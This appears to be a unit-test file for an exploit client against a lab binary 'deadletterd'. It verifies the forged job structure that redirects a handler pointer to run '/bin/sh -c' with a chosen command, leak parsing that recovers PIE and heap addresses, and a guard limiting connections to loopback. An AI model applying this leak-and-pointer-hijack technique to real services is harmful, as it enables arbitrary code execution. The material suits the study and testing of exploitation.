from __future__ import annotations

import struct
import sys
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from exploit.client import (
    ARGV_OFFSET,
    HANDLER_OFFSET,
    INLINE_OFFSET,
    JOB_SIZE,
    PROGRAM_OFFSET,
    STORAGE_LENGTH_OFFSET,
    STORAGE_OFFSET,
    Broker,
    ExploitError,
    analyze_leak,
    build_forged_job,
    qword,
)
from exploit.elf64 import Elf64


TARGET = ROOT / "build" / "deadletterd"


class FakeElf:
    def __init__(self, **symbols: int):
        self._symbols = symbols

    def symbol(self, name: str) -> int:
        return self._symbols[name]


def synthetic_leak(
    elf: FakeElf,
    *,
    pie_base: int = 0x5555_4000_0000,
    job_chunk: int = 0x5555_8000_2000,
) -> bytearray:
    leak = bytearray(JOB_SIZE)
    storage = job_chunk + INLINE_OFFSET
    struct.pack_into("<Q", leak, 0, job_chunk >> 12)
    struct.pack_into("<Q", leak, HANDLER_OFFSET, pie_base + elf.symbol("job_log"))
    struct.pack_into("<Q", leak, PROGRAM_OFFSET, storage)
    struct.pack_into("<Q", leak, ARGV_OFFSET, storage)
    struct.pack_into("<Q", leak, STORAGE_OFFSET, storage)
    return leak


class ForgedJobTests(unittest.TestCase):
    def test_layout_contains_expected_pointers_and_strings(self) -> None:
        job_chunk = 0x5555_8000_2000
        job_exec = 0x5555_4000_2580
        command = "umask 077; printf deadletter-proof"

        forged = build_forged_job(job_chunk, job_exec, command)

        shell = job_chunk + INLINE_OFFSET
        dash_c = shell + len(b"/bin/sh\0")
        script = dash_c + len(b"-c\0")
        self.assertEqual(len(forged), JOB_SIZE)
        self.assertEqual(qword(forged, HANDLER_OFFSET), job_exec)
        self.assertEqual(qword(forged, PROGRAM_OFFSET), shell)
        self.assertEqual(qword(forged, ARGV_OFFSET), shell)
        self.assertEqual(qword(forged, ARGV_OFFSET + 8), dash_c)
        self.assertEqual(qword(forged, ARGV_OFFSET + 16), script)
        self.assertEqual(qword(forged, ARGV_OFFSET + 24), 0)
        self.assertEqual(qword(forged, STORAGE_OFFSET), script)
        self.assertEqual(
            struct.unpack_from("<I", forged, STORAGE_LENGTH_OFFSET)[0], len(command)
        )
        self.assertEqual(forged[INLINE_OFFSET : INLINE_OFFSET + 8], b"/bin/sh\0")
        self.assertEqual(forged[INLINE_OFFSET + 8 : INLINE_OFFSET + 11], b"-c\0")
        self.assertEqual(
            forged[INLINE_OFFSET + 11 : INLINE_OFFSET + 12 + len(command)],
            command.encode("ascii") + b"\0",
        )

    def test_command_must_fit_inline_storage(self) -> None:
        with self.assertRaisesRegex(ExploitError, "does not fit"):
            build_forged_job(0x5555_8000_2000, 0x5555_4000_2580, "A" * 200)


class LeakAnalysisTests(unittest.TestCase):
    def setUp(self) -> None:
        self.elf = FakeElf(job_log=0x2520, job_exec=0x2580)

    def test_valid_leak_derives_pie_and_heap_addresses(self) -> None:
        pie_base = 0x5555_4000_0000
        job_chunk = 0x5555_8000_2000
        leak = synthetic_leak(self.elf, pie_base=pie_base, job_chunk=job_chunk)

        handler, derived_base, job_exec, derived_chunk = analyze_leak(leak, self.elf)

        self.assertEqual(handler, pie_base + self.elf.symbol("job_log"))
        self.assertEqual(derived_base, pie_base)
        self.assertEqual(job_exec, pie_base + self.elf.symbol("job_exec"))
        self.assertEqual(derived_chunk, job_chunk)

    def test_invalid_leaks_are_rejected(self) -> None:
        cases: dict[str, bytes | bytearray] = {}
        cases["short"] = bytes(JOB_SIZE - 1)

        noncanonical = synthetic_leak(self.elf)
        struct.pack_into("<Q", noncanonical, HANDLER_OFFSET, 0x2520)
        cases["noncanonical handler"] = noncanonical

        inconsistent = synthetic_leak(self.elf)
        struct.pack_into("<Q", inconsistent, PROGRAM_OFFSET, qword(inconsistent, PROGRAM_OFFSET) + 8)
        cases["inconsistent job"] = inconsistent

        unaligned_pie = synthetic_leak(self.elf)
        struct.pack_into("<Q", unaligned_pie, HANDLER_OFFSET, qword(unaligned_pie, HANDLER_OFFSET) + 1)
        cases["unaligned PIE"] = unaligned_pie

        unaligned_heap = synthetic_leak(self.elf, job_chunk=0x5555_8000_2008)
        cases["unaligned heap"] = unaligned_heap

        for name, leak in cases.items():
            with self.subTest(name=name), self.assertRaises(ExploitError):
                analyze_leak(leak, self.elf)


class BrokerSafetyTests(unittest.TestCase):
    def test_non_loopback_is_refused_before_connect(self) -> None:
        with patch("exploit.client.socket.create_connection") as connect:
            with self.assertRaisesRegex(ExploitError, "refusing"):
                Broker("192.0.2.10", 31337)
            connect.assert_not_called()

    def test_hostname_and_ipv6_are_refused_before_connect(self) -> None:
        with patch("exploit.client.socket.create_connection") as connect:
            with self.assertRaisesRegex(ExploitError, "literal"):
                Broker("localhost", 31337)
            with self.assertRaisesRegex(ExploitError, "IPv4"):
                Broker("::1", 31337)
            connect.assert_not_called()


class ElfParserTests(unittest.TestCase):
    def test_built_target_is_pie_and_exports_job_symbols(self) -> None:
        self.assertTrue(TARGET.is_file(), f"missing target binary: {TARGET}")
        elf = Elf64(TARGET)

        elf.require_pie()
        self.assertEqual(elf.file_type, 3)
        self.assertEqual(elf.machine, 62)
        self.assertGreater(elf.symbol("job_log"), 0)
        self.assertGreater(elf.symbol("job_exec"), 0)
        self.assertEqual(elf.function("job_log"), elf.symbol("job_log"))
        self.assertEqual(elf.function("job_exec"), elf.symbol("job_exec"))
        self.assertNotEqual(elf.symbol("job_log"), elf.symbol("job_exec"))
        self.assertEqual(len(elf.sha256), 64)


if __name__ == "__main__":
    unittest.main()
